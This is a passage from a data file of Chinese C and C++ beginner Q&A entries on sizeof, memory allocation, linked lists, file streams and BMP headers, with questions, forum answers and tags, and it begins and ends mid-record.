head-&gt;next;\r\n\t\t\tfree(cur); // 运行到这里总会崩溃\r\n\t\t\tcur = NULL;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nint main()\r\n{\r\n\tint start = 1;\r\n\twhile (start)\r\n\t{\r\n\t\tmenu();\r\n\t\tint num;\r\n\t\tcin &gt;&gt; num;\r\n\t\tswitch (num)\r\n\t\t{\r\n\t\tcase 1: {addStu(); break; }\r\n\t\tcase 2: {display(); break; }\r\n\t\tcase 3: {search(); break; }\r\n\t\tdefault: {exitApp(); start = 0; }\r\n\t\t}\r\n\t}\r\n\tsystem(\"pause\");\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["free释放链表内存总是出错，求高手指点！！", ["#include ", "\n#include ", "\n#include ", "\nusing namespace std;", "\n#define TRUE 1", "\n#define FALSE 0", "\ntypedef struct Student", "\n{", "\n    char num[10];", "\n    char name[10];", "\n    char grade[10];", "\n}Student;", "\n\n", "typedef struct StuList", "\n{", "\n    Student data;", "\n    StuList *next;", "\n}StuList, *lpStuList;", "\n\n", "lpStuList stuList = NULL;//全局的学生信息链表", "\nlpStuList head = NULL; //全局的链表头节点", "\n\n", "void menu()", "\n{", "\n    cout << \"选择(1:输入数据 2:输出数据 3:按姓名查找数据 其他:退出):\" << endl;", "\n}", "\n\n", "int addStu()", "\n{", "\n    int num;", "\n    cout << \"输入数据\" << endl << \"学生人数:\";", "\n    cin >> num;", "\n    if (stuList == NULL)", "\n    {", "\n        stuList = (lpStuList)malloc(sizeof(Student));", "\n        if (stuList != NULL)", "\n        {", "\n            stuList->next = NULL;", "\n        }", "\n    }", "\n    lpStuList cur = NULL;", "\n    for (int i = 1; i <= num; ++i)", "\n    {", "\n        Student student;", "\n        cur = NULL;", "\n        cur = (lpStuList)malloc(sizeof(Student));", "\n        cout << \"第\" << i << \"个学生(学号 姓名 成绩):\";", "\n        cin >> student.num >> student.name >> student.grade;", "\n        cur->data = student;", "\n        cur->next = NULL;", "\n        if (head == NULL)", "\n        {", "\n            head = cur;", "\n        }", "\n        else stuList->next = cur;", "\n        stuList = cur;", "\n    }", "\n    return TRUE;", "\n}", "\n\n", "int display()", "\n{", "\n    cout << \"输出数据\" << endl;", "\n    lpStuList cur = NULL;", "\n    cur = head;", "\n    if (cur == NULL)", "\n    {", "\n        cout << \"没有任何学生信息哦\" << endl;", "\n        return FALSE;", "\n    }", "\n    else", "\n    {", "\n        cout << \"学号\\t\\t姓名\\t\\t成绩\" << endl;", "\n        while (cur != NULL)", "\n        {", "\n            cout << cur->data.num << \"\\t\\t\" << cur->data.name << \"\\t\\t\" << cur->data.grade << endl;", "\n            cur = cur->next;", "\n        }", "\n        return TRUE;", "\n    }", "\n}", "\n\n", "void search()", "\n{", "\n    char name[10];", "\n    cout << \"按姓名查找数据\" << endl << \"请输入姓名：\";", "\n    cin >> name;", "\n    lpStuList cur = NULL;", "\n    cur = head;", "\n    int ok = 0;", "\n    while (cur != NULL)", "\n    {", "\n        if (strstr(cur->data.name, name) != NULL)", "\n        {", "\n            if (ok == 0)", "\n            {", "\n                cout << \"学号\\t\\t姓名\\t\\t成绩\" << endl;", "\n                ok = 1;", "\n            }", "\n            cout << cur->data.num << \"\\t\\t\" << cur->data.name << \"\\t\\t\" << cur->data.grade << endl;", "\n        }", "\n        cur = cur->next;", "\n    }", "\n    if (ok == 0)", "\n    {", "\n        cout << \"未找到符合的信息哦\" << endl;", "\n    }", "\n}", "\n\n", "void exitApp()", "\n{", "\n    if (head != NULL)", "\n    {", "\n        lpStuList cur = NULL;", "\n        while (head != NULL)", "\n        {", "\n            cur = head;", "\n            head = head->next;", "\n            free(cur); // 运行到这里总会崩溃", "\n            cur = NULL;", "\n        }", "\n    }", "\n}", "\n\n", "int main()", "\n{", "\n    int start = 1;", "\n    while (start)", "\n    {", "\n        menu();", "\n        int num;", "\n        cin >> num;", "\n        switch (num)", "\n        {", "\n        case 1: {addStu(); break; }", "\n        case 2: {display(); break; }", "\n        case 3: {search(); break; }", "\n        default: {exitApp(); start = 0; }", "\n        }", "\n    }", "\n    system(\"pause\");", "\n}"]], "Tag": "程序设计"}
{"Answer": "数组占用了一段连续的内存空间。然后，我们可以通过指定数组下标来访问这块内存里的不同位置。因此，当你的下标过大时，访问到的内存，就不再是这个数组“份内”的内存。你访问的，将是其它变量的内存了,它的值是不确定的,不可控的,它会使按照数组读取方法调用的这块内存的其他类不能正确解析到需要的值本来你就想要个10 来了个2^32-1 你让别人怎么玩?", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["数组越界访问时会发生什么 尽管编译不出错", ["int a[ 10 ] ;  访问a[ 10 ]的话就会出现越界的错误  今天想了一下 下标访问数组可以看作指针访问的形式 也就是取( & a[ 0 ] + 10 * sizeof ( int ) ) 这个地址里的内容 然后我就想 反正数组是连续存储的 用了后面那四个字节的内存又怎么样呢 应该不会是无意义的内存吧 那为什么会出现Bug或者程序中断呢 求解"]], "Tag": "程序设计"}
{"Answer": "char readData[1024] = {'\\0'};\r\n修改为\r\nunsigned char readData[1024] = {'\\0'};\r\n看看", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言在接收网络数据的溢出问题", ["代码如下：", "\n\n", " int main() {\n            struct sockaddr_in addr, fromAddr;\n          int socketd, linkSocketd, num;\n          size_t size;\n\n          char readData[1024] = {'\\0'};\n          addr.sin_family = AF_INET;\n          addr.sin_port = htons(9900);\n          addr.sin_addr.s_addr = INADDR_ANY;\n\n                socketd = socket(PF_INET, SOCK_STREAM, 0);\n        if(socketd == -1) {\n                         perror(\"socket\");\n                                 return 1;\n                }\n          if(bind(socketd, (struct sockaddr*)&addr, 16) == -1) {\n                perror(\"bind\");\n                return 1;\n        }\n        listen(socketd, 20);\n        linkSocketd = accept(socketd, (struct sockaddr*)&addr, &size);\n        if(linkSocketd == -1) {\n                perror(\"accept\");\n                return 1;\n        }\n\n                size = sizeof(fromAddr);\n        readSize = recvfrom(linkSocketd, (void*)&readData, sizeof(readData), 0, &fromAddr, &size);\n        printf(\"接收到%d字节\\n\", readSize);\n        for(num = 0; num <readSize; num++) {\n                printf(\"print_data[%d]:%x\\n\", num, readData[num]);\n        }\n          return 0;\n}\n\n", "\n\n", "结果：", "\n接收到22字节", "\nprint_data[0]:68", "\nprint_data[1]:3a", "\nprint_data[2]:0", "\nprint_data[3]:3a", "\nprint_data[4]:0", "\nprint_data[5]:68", "\nprint_data[6]:ffffffc9", "\nprint_data[7]:ffffffff", "\nprint_data[8]:ffffffff", "\nprint_data[9]:1", "\nprint_data[10]:69", "\nprint_data[11]:0", "\nprint_data[12]:2", "\nprint_data[13]:73", "\nprint_data[14]:0", "\nprint_data[15]:0", "\nprint_data[16]:1", "\nprint_data[17]:0", "\nprint_data[18]:0", "\nprint_data[19]:0", "\nprint_data[20]:ffffffa7", "\nprint_data[21]:16", "\n在第6、7、8、20元素的结果为何会出现这种情况？？？？？"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; a[]&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#34;lavender&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt; b[&lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;]&amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#34;lavender&amp;#34;&lt;/span&gt;;\n    &lt;span class=\"hljs-type\"&gt;char&lt;/span&gt;* c &amp;#61;&lt;span class=\"hljs-string\"&gt;&amp;#34;lavenderdfdf&amp;#34;&lt;/span&gt;;\n\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%p, %p\\n&amp;#34;&lt;/span&gt;, a, b); \n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;sizeof a is %d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(a));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;sizeof b is %d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(b));\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;sizeof c is %d\\n&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(c));\n    \n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;输出是&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;[&lt;span class=\"hljs-meta\"&gt;root&amp;#64;hadoop1 test&lt;/span&gt;]&lt;span class=\"hljs-meta\"&gt;# gcc test23.c &amp;amp;&amp;amp; ./a.out &lt;/span&gt;\n&lt;span class=\"hljs-number\"&gt;0x7fffaa45e070&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;0x7fffaa45e000&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt; a &lt;span class=\"hljs-keyword\"&gt;is&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;9&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt; b &lt;span class=\"hljs-keyword\"&gt;is&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;100&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt; c &lt;span class=\"hljs-keyword\"&gt;is&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;  \n如果你是&lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;位的编译器&lt;span class=\"hljs-keyword\"&gt;sizeof&lt;/span&gt; c &lt;span class=\"hljs-keyword\"&gt;is&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;\n\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个应该怎么操作才能做出来呢", [" int main()", "{", " char a[]=\"lavender\";", " char b[100]=\"lavender\";", " char* c =\"lavenderdfdf\";", " printf(\"p, p,\\n\", a, b);", " printf(\"sizeof is d\\n\", sizeof())", " printf(\"sizeof b is d\\n\", sizeof(b))", " printf(\"sizeof c is d\", sizeof(c))", " return 0;", "}", "输出是啥?你猜猜咯,顺便说一声,我的编译器的环境是32位的"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;sizeof(s)&amp;#xff0c;s是指针&amp;#xff0c;存地址32位机指针占4字节  64位机占8字节  &lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["万万没想到栽在了这里", ["我的理解是，sizeof比strlen多算一个\\0，但是为什么sizeof是4呢😭"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为int型变量大小为4&amp;#xff0c;你sizeof&amp;#xff08;4&amp;#xff09;也是4&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt; &lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;,&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;));\n&lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img width=\"600px\" align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/362737119236125.png\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["大一新生刚学c语言感觉太懵了", ["sizeof3为什么等于4", "那sizeof4是不是就是等于5那", "就是在那个数的基础上加一是不是"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;printf(&amp;#34;size of int &amp;#61; %d&amp;#34;, sizeof(int));&lt;br /&gt;printf(&amp;#34;size of long &amp;#61; %d&amp;#34;, sizeof(long));&lt;br /&gt;printf(&amp;#34;size of float &amp;#61; %d&amp;#34;, sizeof(float));&lt;/p&gt;\n&lt;p&gt;char short double bool ......&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["折磨啊，这个怎么弄，题在下边", ["利用sizeof()函数，计算C语言各种数据类型在VC6.0开发环境下所占用的存储空间大小？"]], "Tag": "程序设计"}
{"Answer": "用append模式\r\n\r\n```\r\n fstream booklist(\"booklist.txt\", ios::binary | ios::app | ios::in | ios::out);\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++文件写入时会覆盖之前的数据", ["在不过是用ofstream还是fstream打开文件，也用过ios::app|ios::out或者ios::in|ios::out都在写入的时候会覆盖之前的内容，开始以为是输出的问题，但是我在用eof遍历时候（输入几行）但是只能谁出一行。", "\n\n", "#include", "\n#include", "\n#include", "\nusing namespace std;", "\nstruct Book", "\n{", "\n    char Name[20];", "\n    int No;", "\n    int Num;", "\n    float Price;", "\n};", "\nvoid main()", "\n{", "\n    fstream booklist(\"booklist.txt\", ios::binary | ios::trunc | ios::in | ios::out);", "\n    if (!booklist)", "\n    {", "\n        cout << \"Can't open the file\" << endl;", "\n        exit(1);", "\n    }", "\n    Book BL;", "\n    for (int i = 1; i < 4; i++)", "\n    {", "\n        cout << \"请输入第\" << i << \"种书的名字、编号、库存量和价格\" << endl;", "\n        cin >> BL.Name >> BL.No >> BL.Num >> BL.Price;", "\n        //Book ", "head1;", "\n        //head1 = NULL;", "\n        //createmsg(Book *head1);", "\n        booklist.write((char", ")&BL, sizeof(Book));", "\n    }", "\n    for (int i = 4; i >2; i--)", "\n    {", "\n        booklist.seekg((i - 1)*sizeof(Book), ios::beg);", "\n        booklist.read((char*)&BL, sizeof(Book));", "\n        booklist.write((char*)&BL, sizeof(Book));", "\n    }", "\n    cout << \"请输入第\" << 10 << \"种书的名字、编号、库存量和价格\" << endl;", "\n    cin >> BL.Name >> BL.No >> BL.Num >> BL.Price;", "\n    booklist.seekg(10 * sizeof(Book), ios::beg);", "\n    booklist.write((char*)&BL, sizeof(Book));", "\n    int count = 0;", "\n    int sum = 0;", "\n    booklist.seekg(0, ios::beg);", "\n    cout << \"书名\" << '\\t' << \"编号\" << '\\t' << \"库存量\" << '\\t' << \"价格\" << endl;", "\n    //for (int i = 0; i < 4; i++) ", "\n    //{", "\n    while(!booklist.eof())", "\n    {", "\n        booklist.read((char*)&BL, sizeof(Book));", "\n        cout << BL.Name << '\\t' << BL.No << '\\t' << BL.Num << '\\t' << BL.Price << endl;", "\n        count += BL.Num;", "\n        sum += BL.Num*BL.Price;", "\n    }", "\n    cout << \"总库存量是：\" << count << '\\t' << \"总价格为：\" << sum << endl;", "\n    getchar();", "\n    return;", "\n}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;1.结构体应该是List&amp;#xff0c;不是list&lt;br /&gt;2.分配内存记得进行类型转换,array是int *&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//顺序表的创建&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;//自定义类型&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;List&lt;/span&gt; {\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; * array;\n    &lt;span class=\"hljs-comment\"&gt;//指向顺序表的底层数组&lt;/span&gt;\n    &lt;span class=\"hljs-comment\"&gt;//?&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; capacity;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; size;\n};\n&lt;span class=\"hljs-keyword\"&gt;typedef&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;List&lt;/span&gt;* arraylist;\n&lt;span class=\"hljs-comment\"&gt;//将list的指针定义为arraylist&lt;/span&gt;\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;initlist&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;(arraylist list)&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-comment\"&gt;//容量设定为10&lt;/span&gt;\n    list-&amp;gt;array&amp;#61;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; *)&lt;span class=\"hljs-built_in\"&gt;malloc&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;) * &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;);\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (list-&amp;gt;array &amp;#61;&amp;#61; &lt;span class=\"hljs-literal\"&gt;NULL&lt;/span&gt;)\n        &lt;span class=\"hljs-comment\"&gt;//内存申请失败&lt;/span&gt;\n        &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    list-&amp;gt;size &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    list-&amp;gt;capacity &amp;#61; &lt;span class=\"hljs-number\"&gt;10&lt;/span&gt;;\n    &lt;span class=\"hljs-comment\"&gt;//申请动态内存空间&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n}\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-keyword\"&gt;struct&lt;/span&gt; &lt;span class=\"hljs-title class_\"&gt;List&lt;/span&gt; list;\n    &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(&lt;span class=\"hljs-built_in\"&gt;initlist&lt;/span&gt;(&amp;amp;list))\n    {\n    }\n    &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt;\n    {\n        &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;初始化失败&amp;#xff01;&amp;#34;&lt;/span&gt;);\n    }\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["顺序表，这段代码哪里错了", ["\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<stdlib.h>", "\n", "//顺序表的创建", "\n", "//自定义类型", "\n", "struct", " ", "list", " {\n    ", "int", " * array;\n    ", "//指向顺序表的底层数组", "\n    ", "//?", "\n    ", "int", " capacity;\n    ", "int", " size;\n};\n", "typedef", " ", "struct", " ", "list", "* arraylist;\n", "//将list的指针定义为arraylist", "\n", "int", " ", "initlist", "(arraylist list)", "\n", "{\n    ", "//容量设定为10", "\n    list->array=", "malloc", "(", "sizeof", "(", "int", ") * ", "10", ");\n    ", "if", " (list->array == ", "NULL", ")\n        ", "//内存申请失败", "\n        ", "return", " ", "0", ";\n    list->size = ", "0", ";\n    list->capacity = ", "10", ";\n    ", "//申请动态内存空间", "\n    ", "return", " ", "1", ";\n}\n", "int", " ", "main", "()", "\n", "{\n    ", "struct", " ", "List", " list;\n    ", "if", "(", "initlist", "(&list))\n    {\n\n    }\n    ", "else", "\n    {\n        ", "printf", "(", "\"初始化失败！\"", ");\n    }\n}\n"]], "Tag": "程序设计"}
{"Answer": "问题是，调色板 r    g    b三值相等啊，还有怎么会变三通道呢", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["用C语言将bmp 8位灰度图的灰度值缩小16倍，调色板中数值由255行变成16行调", ["用C语言将bmp 8位灰度图的灰度值缩小16倍，由0-255变成0-16，调色板中数值由255行变成16行，同时调色板rgbBlue  rgbRed   rgbGreen数值范围由0-255变成0-1。我用c语言实现后，为什么图片不再是灰度图，有了其他颜色？？？", "\n\n", "```#pragma once", "\n#ifndef BMP_H_INCLUDED", "\n#define BMP_H_INCLUDED", "\n#include ", "\n#include ", "\n#include ", "\n#include ", "\n#include ", "\n#include ", "\ntypedef unsigned short WORD;//2字节", "\ntypedef unsigned long DWORD;//4字节", "\ntypedef long LONG;", "\ntypedef unsigned char BYTE;", "\n#define pi  3.1415926535", "\n\n", "/* 位图文件头结构 14字节 */", "\ntypedef struct tagBITMAPFILEHEADER", "\n{ // bmfh", "\n    WORD bfType;//位图文件类型,必须为BMP（0-1字节）", "\n    DWORD bfSize;//位图文件大小，以字节为单位（2-5字节）", "\n    WORD bfReserved1;//位图文件保留字，必须为0（6-7字节）", "\n    WORD bfReserved2;//位图文件保留字，必须为0（8-9字节）", "\n    DWORD bfOffBits;//位图数据的起始位置，以相对于位图文件头的偏移量表示（10-13字节）", "\n}BITMAPFILEHEADER;", "\n\n", "/* 位图信息头结构 40字节 */", "\ntypedef struct tagBITMAPINFOHEADER", "\n{ // bmih", "\n    DWORD biSize; // 本结构占得字节数（14-17字节），结构长度 40B", "\n    LONG biWidth;//位图的宽度,以像素为单位（18-21字节）", "\n    LONG biHeight;//位图的高度，以像素为单位（22-25字节）", "\n    WORD biPlanes;//颜色面板值必须为1（26-27字节）", "\n    WORD biBitCount;// 表示颜色要用到的位数，颜色位值可以是1（双色）,（28-29字节）", "\n    //4（16色）,8（256色）,16（64K色，高彩色）,24（16M，真彩色）,32（4096M增强型真彩色）中的一个", "\n    DWORD biCompression;// 压缩格式,必须是0（不压缩）（30-33字节）", "\n    //1（ＢＩ＿ＲＬＥ８压缩类型）或２（ＢＩ＿ＲＬＥ４压缩类型）或3（Bitfields，位域存放）", "\n    DWORD biSizeImage;// 位图的大小，位图占用字节数=biWidth（4的整倍数）*biHeight", "\n    LONG biXPelsPerMeter;// 水平分辨率，每米像素数（３８－４１字节）", "\n    LONG biYPelsPerMeter;// 垂直分辨率，每米像素数（４２－４５字节）", "\n    DWORD biClrUsed;// 位图实际使用的颜色表中的颜色数，（４６－４９字节）", "\n    DWORD biClrImportant;// 位图显示过程中重要的颜色数（５０－５３字节）", "\n}BITMAPINFOHEADER;", "\n\n", "/* 调色板 4字节 */", "\n//颜色表中RGBQUAD结构数据的个数由biBitCount来确定", "\n//颜色表中RGBQUAD结构数据的个数有biBitCount来确定:", "\n//　当biBitCount=1,4,8时，分别有2,16,256个表项;????????????", "\n//　当biBitCount=24时，没有颜色表项", "\ntypedef struct tagRGBQUAD", "\n{ // rgbq", "\n    double rgbBlue;//蓝色的亮度（值得范围0-255）", "\n    double rgbGreen;//绿色的亮度", "\n    double rgbRed;//红色的亮度", "\n    double rgbReserved;//保留，必须为0", "\n}RGBQUAD;", "\n\n", "//位图数据", "\n//位图数据记录了位图的每一个像素值，记录顺序是在扫描行内是从左到右,", "\n//扫描行之间是从下到上。位图的一个像素值所占的字节数:", "\n/*　当biBitCount=1时，8个像素占1个字节;", "\n　　当biBitCount=4时，2个像素占1个字节;", "\n  　　当biBitCount=8时，1个像素占1个字节;", "\n    　　当biBitCount=24时,1个像素占3个字节;*/", "\n//Windows规定一个扫描行所占的字节数必须是4的倍数(即以long为单位),不足的以0填充，", "\n/* 定义图像信息 */", "\ntypedef struct tagBITMAPINFO", "\n{", "\n    BITMAPINFOHEADER bmiHeader;//位图信息头", "\n    RGBQUAD bmiColors[1];//颜色表", "\n}BITMAPINFO;", "\n\n", "/* 定义位图图像 ", "/", "\ntypedef struct _Bitmap", "\n{", "\n    BITMAPFILEHEADER bmfh;", "\n    BITMAPINFOHEADER bmih;", "\n    int width;", "\n    int height;", "\n    int bitCount;     // 8 或者24", "\n    int imageSize;    // 图像数据大小(imageSize=height*widthStep）字节", "\n    BYTE", " imageData;  //排列的图像数据，指向存储空间第一个单元的", "\n    int widthStep;    //排列的图像行大小，不够4的整数倍的就补0", "\n}Bitmap;", "\n\n", "/**", "\n\n", "\n", "位图创建函数  创建一个Bitmap结构，并为图像数据分配空间\n*", "\n", "使用方法：", "\n", "    Bitmap ", "bmp=(Bitmap", ")malloc(sizeof(Bitmap));", "\n", "\n", "ret=CreateBitmap(bmp,50,50,3);\n", "\n\n", "/", "\nint CreateBitmap(Bitmap", " bmp, int width, int height, int bitCount)", "\n{", "\nbmp->width = width;", "\nbmp->height = height;", "\nbmp->bmih.biWidth = width;", "\nbmp->bmih.biHeight = height;", "\n\n", "bmp->widthStep = (int)((width*bitCount + 31) / 32) * 4; //可是为什么这样计算？？？？？？？？？？？？", "\n//eg:5*5的灰度图像，bitcount=8,则计算出来，widthstep=8,一行的像素个数不够4的倍数的补0", "\nbmp->imageSize = bmp->height*bmp->widthStep*sizeof(BYTE);//计算排列的图像大小sizeof(BYTE)=1", "\n\n", "if (bitCount == 8)", "\n{", "\n    bmp->bitCount = 8;", "\n    bmp->bmfh.bfType = 0x4d42;    //注意是4d42 这个地方折磨我一下午啊", "\n    bmp->bmfh.bfReserved1 = 0;", "\n    bmp->bmfh.bfReserved2 = 0;", "\n    bmp->bmih.biBitCount = 8;", "\n    bmp->bmih.biSize = 40;", "\n    bmp->bmih.biPlanes = 1;", "\n    bmp->bmfh.bfSize = 54 + 256 * 4 + height*bmp->widthStep;", "\n    bmp->bmfh.bfOffBits = 1078;", "\n    bmp->bmih.biBitCount = 8;", "\n    bmp->bmih.biCompression = 0;", "\n    bmp->bmih.biSizeImage = bmp->imageSize;", "\n    bmp->bmih.biClrUsed = 0;", "\n    bmp->bmih.biClrImportant = 0;", "\n    bmp->bmih.biXPelsPerMeter = 0;", "\n    bmp->bmih.biYPelsPerMeter = 0;", "\n}", "\nelse if (bitCount == 24)", "\n{", "\n    bmp->bitCount = 24;", "\n    bmp->bmfh.bfType = 0x4d42;", "\n    bmp->bmih.biBitCount = 24;", "\n    bmp->bmfh.bfReserved1 = 0;", "\n    bmp->bmfh.bfReserved2 = 0;", "\n    bmp->bmih.biSize = 40;", "\n    bmp->bmih.biPlanes = 1;", "\n    bmp->bmfh.bfSize = 54 + height*bmp->widthStep;", "\n    bmp->bmfh.bfOffBits = 54;", "\n    bmp->bmih.biBitCount = 24;", "\n    bmp->bmih.biSizeImage = bmp->imageSize;", "\n    bmp->bmih.biClrUsed = 0;", "\n    bmp->bmih.biCompression = 0;", "\n    bmp->bmih.biClrImportant = 0;", "\n    bmp->bmih.biXPelsPerMeter = 0;", "\n    bmp->bmih.biYPelsPerMeter = 0;", "\n}", "\nelse", "\n{", "\n    printf(\"Error(CreateBitmap): only supported 8 or 24 bits bitmap.\\n\");", "\n    return -1;", "\n}", "\n\n", "bmp->imageData = (BYTE*)malloc(bmp->imageSize);        //分配数据空间", "\nif (!(bmp->imageData))", "\n{", "\n    printf(\"Error(CreateBitmap): can not allocate bitmap memory.\\n\");", "\n    return -1;", "\n}", "\nreturn 0;", "\n}", "\n", "\n", "/**", "\n\n", "\n", "位图指针释放函数  释放位图数据空间\n*", "\n", "使用方法：", "\n", "    ReleaseBitmap(bmp);\n", "/\nvoid ReleaseBitmap(Bitmap", " bmp)\n{\nfree(bmp->imageData);\nbmp->imageData = NULL;\nfree(bmp);\nbmp = NULL;\n}", "\n", "/**", "\n\n", "\n", "路径检查函数：是否为BMP文件，是否可读", "\n", "正确返回0，错误返回-1\n*", "\n", "使用方法", "\n", "\n", "    ret=CheckPath(path);\n", "\n\n", "*/", "\nint CheckPath(char *path)", "\n{", "\nFILE *fd;", "\nint len = strlen(path) / sizeof(char);", "\nchar ext[3];", "\n//check whether the path include the characters \"bmp\" at end", "\nstrncpy(ext, &path[len - 3], 3);", "\nif (!(ext[0] == 'b' 